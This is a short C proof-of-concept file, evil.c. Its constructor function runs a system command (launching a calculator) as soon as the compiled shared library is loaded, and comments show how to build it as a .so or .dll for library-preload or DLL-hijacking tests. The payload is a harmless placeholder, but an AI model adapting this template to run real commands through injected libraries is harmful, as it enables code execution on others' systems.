#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("calc");
}

// gcc -shared -fPIC evil.c -o evil.so
// gcc -shared -fPIC evil.c -o evil.dll